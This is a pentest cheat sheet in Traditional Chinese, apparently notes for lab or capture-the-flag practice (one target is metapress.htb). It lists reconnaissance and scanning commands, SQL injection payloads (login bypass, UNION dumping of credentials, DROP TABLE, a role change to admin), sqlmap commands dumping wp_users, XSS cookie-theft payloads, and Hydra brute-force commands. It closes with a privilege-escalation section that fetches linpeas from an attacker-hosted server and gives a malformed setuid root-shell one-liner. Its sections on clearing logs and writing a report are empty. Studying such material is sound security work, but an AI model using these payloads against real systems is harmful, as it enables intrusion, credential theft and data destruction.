## 收集情報
被動情報收集
- whois target.com：查詢網域註冊擁有者、DNS 伺服器與註冊商資訊。
- nslookup target.com：查詢目標網域的 IP 位址。
- dig target.com ANY：查詢該網域的所有 DNS 紀錄（A, AAAA, MX, TXT 等）。

主動情報收集
連接埠掃描與服務識別
- nmap -sV -sC -O -p- -T4 --min-rate 5000 [目標IP] -oN scan_result.txt
- nmap -sS -A -p- [目標IP]
- arp-scan -l -> 掃描區域網路內所有設備的 MAC 與 IP 位址。
- nikto -host http://target.com/ -> 自動找常見 Web 漏洞

Web 資訊與路徑目錄強制爆破 -> 針對 Web 伺服器，收集網站架構、隱藏目錄、備份檔案及後台路徑。
- whatweb http://target.com：辨識網站使用的 CMS（如 WordPress）、網頁伺服器（Nginx/Apache）及 JavaScript 框架。
- dirb http://target.com：使用內建字典檔爆破網站的隱藏目錄與檔案。
- gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt：使用 Go 語言開發的高速目錄爆破工具，指定特定字典檔進行搜尋。

DNS 子網域爆破 -> 尋找目標企業可能遺忘或未受保護的子網域
- dnsrecon -d target.com -t axfr：嘗試進行 DNS 區域傳送（Zone Transfer）漏洞測試，若成功可直接獲取所有子網域。
- amass enum -d target.com：使用 OWASP Amass 工具，整合多種被動與主動技術爆破子網域。
- amass enum -passive -d target.com -o target_subdomains.txt -> 安全版
子網域清單（Subdomain List）您會抓到 target.com 底下所有活著（或曾經存在）的子網域，例如：vpn.target.com、stage.target.com、api-dev.target.com 等。
情報來源標籤（Sources）因為加上了 -src，每一個找到的子網域前面都會標註它是怎麼被發現的。例如：[Brute Force] mfa.target.com（代表是靠暴力破解字典猜到的）、[Crtsh] mail.target.com（代表是從憑證日誌中撈到的）。這對評估資產的「隱蔽性」非常有幫助。
網路拓撲架構（Network Topology）Amass 會自動解析這些子網域的 IP 位址、ASN（自治系統號）、以及所屬的網段（CIDR Block）。這能幫您理清目標企業是把服務託管在 AWS、GCP 還是自家機房。

SQL injection
1. 身份驗證繞過型 -> 利用布林（Boolean）邏輯，讓 WHERE 條件的判斷結果永遠為 TRUE。原本後端寫：SELECT * FROM users WHERE user = '$input' AND pass = '$pass'；注入後變成：SELECT * FROM users WHERE user = '' OR 1=1 -- ' AND pass = '$pass'(解析：資料庫讀到 --  後，後面的密碼檢查直接被廢棄，且 1=1 永遠成立，直接登入第一筆資料，通常是 Admin)
- ' OR 1=1 --
- ' OR 'a'='a
- ' OR 1=1#
2. 聯合查詢型（UNION-based）-> 在原本的查詢結果後面「疊加」攻擊者自己想查的表單資料。（前提：回傳的欄位數量與資料型態必須完全一致）
(1) 步驟一：探測原語句有幾個欄位（測試到資料庫報錯為止）
- ' ORDER BY 1 -- 
- ' ORDER BY 2 --  ...（假設到 ORDER BY 4 報錯，代表有 3 個欄位）
(2) 步驟二：找出網頁會顯示哪個欄位的資料（顯錯點）
- ' UNION SELECT null, null, null -- 
- ' UNION SELECT 'a', 'b', 'c' -- 
(3) 步驟三：撈取敏感資料
- ' UNION SELECT null, username, password FROM admin -- 
- ' UNION SELECT null, @@version, null --  （偷看資料庫版本）
3. 報錯注入型（Error-based）-> 當應用程式會直接把資料庫的 Error Message 印在網頁上時使用。故意寫錯語法，讓資料庫在「罵你的錯訊息」裡面順便把資料吐出來。
經典語法（以 MySQL 的 extractvalue 函數為例）： (資料庫噴出的錯誤訊息會長這樣：XPATH syntax error: '~8.0.32-0ubuntu0.22.04.2' (版本號直接被塞在報錯文字裡露餡)
- ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version))) --
4. 盲註型（Blind SQLi） -> 當網頁完全不顯示查詢資料、也不顯示報錯訊息時（只會顯示「成功」或「失敗」頁面），資安人員會像玩終極密碼一樣，一個字一個字去「猜」。
(1) 布林盲註（看頁面有沒有變，猜 True/False）： -> (如果頁面正常載入，代表密碼第一個字就是 a；如果跳到錯誤頁，就繼續試 b、c、d...)
- ' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a' --
(2) 間盲註（讓資料庫睡覺，看網頁載入時間長短）： -> (如果按下送出後，網頁「卡了 5 秒才跑完」，代表條件成立)
- ' AND IF(1=1, SLEEP(5), 0) --
5. 堆疊查詢型（Stacked Queries）-> 利用分號 ; 代表「上一句結束，接續執行下一句」，這是最致命的注入，可直接竄改資料庫。
經典語法：
- '; DROP TABLE users; -- 
- '; UPDATE users SET role='admin' WHERE id=45; --
(註：這極度依賴後端資料庫驅動程式「是否開啟了支援多指令批次執行」的功能)


## 漏洞利用
1. sqlmap
- sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data "action=bookingpress_front_get_category_services&_wpnonce=[your nonce]&category_id=33&total_service=1" -p total_service --dbs --batch
- sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data "action=bookingpress_front_get_category_services&_wpnonce=[your nonce]&category_id=33&total_service=1" -p total_service -D blog --tables --batch
- sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data "action=bookingpress_front_get_category_services&_wpnonce=[your nonce]&category_id=33&total_service=1" -p total_service -D blog --T wp_users --dump --batch
- curl -s "http://metapress.htb" | grep -iE "nonce|bookingpress"

2. XSS -> 使用 BurpSuite 攔截封包
- <script>alert(1)</script>
- <script>alert(document.cookie)</script>
- <svg/onload=alert(1)>
- <img src=# onerror=alert(1)>
- <a href="javascript:alert(1)">g</a>
- <input type="text" value="g" onmouseover="alert(1)" />
- <iframe src="javascript:alert(1)"></iframe>

3. Hydra -> /usr/share/wordlists
- SSH
hydra -l root -P passwords.txt 192.168.1.1 ssh
- FTP
hydra -L users.txt -P passwords.txt -t 4 192.168.1.50 ftp
- 網頁表單
hydra -l admin -P pass.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:Login failed"
https://minmin0625.medium.com/%E6%BB%B2%E9%80%8F%E6%B8%AC%E8%A9%A6lab-%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8hydra-nmap-%E5%9F%B7%E8%A1%8C%E9%81%A0%E7%AB%AF%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3-a21d9b8149e0
https://ithelp.ithome.com.tw/m/articles/10321942

4. Linux 提權
- https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#nopasswd
- LinPEAS -> https://github.com/carlospolop/PEASS-ng
(1) wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
(2) sudo python3 -m http.server 80
(3) wget http://[attacker ip]:80/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee output.txt
(4) cat output.txt
(5) python3 -c 'import os; os.os.setuid(0); os.system("/bin/sh")
https://ithelp.ithome.com.tw/m/articles/10328790

- LinEnum -> https://github.com/rebootuser/LinEnum
- Linux Exploit Suggester -> https://github.com/mzet-/linux-exploit-suggester


## 清除紀錄

## 撰寫報告
